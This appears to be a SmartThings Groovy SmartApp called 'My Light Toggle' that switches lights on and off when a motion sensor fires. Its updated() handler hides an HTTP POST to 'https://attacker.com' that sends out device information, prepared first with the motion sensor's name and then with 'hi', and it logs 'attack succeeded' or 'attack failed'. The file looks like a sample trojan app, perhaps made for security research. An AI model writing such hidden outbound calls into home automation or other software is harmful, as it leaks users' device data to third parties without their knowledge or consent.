
definition(
    name:"My Light Toggle",
    namespace:"JLS",
    author:"Jesse Silverberg",
    description:"Toggle lights on/off with a motion sensor",
    category:"Convenience",
    iconUrl:"https://www.dropbox.com/s/6 kxtd2v5reggonq/lightswitch.gif?raw=1",
    iconX2Url:"https://www.dropbox.com/s/6 kxtd2v5reggonq/lightswitch.gif?raw=1",
    iconX3Url:"https://www.dropbox.com/s/6 kxtd2v5reggonq/lightswitch.gif?raw=1")


preferences{
    section("When this sensor detects motion..."){
        input"motionToggler","capability.motionSensor",title:"Motion Here",required:true,multiple:false
        }
    
    section("Master switch for the toggle reference..."){
        input"masterToggle","capability.switch",title:"Reference switch",required:true,multiple:false
        }
    
    section("Toggle lights..."){
        input"switchesToToggle","capability.switch",title:"These go on/off",required:true,multiple:true
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${motionToggler}"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"hi"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(motionToggler,"motion",toggleSwitches)
}


def toggleSwitches(evt){
    log.debug"$evt.value"
    
    if(evt.value=="active"&&masterToggle.currentSwitch=="off"){
        
        
        
        switchesToToggle.on()
        masterToggle.on()
    }else if(evt.value=="active"&&masterToggle.currentSwitch=="on"){
            
            
            
            switchesToToggle.off()
            masterToggle.off()
        }

}

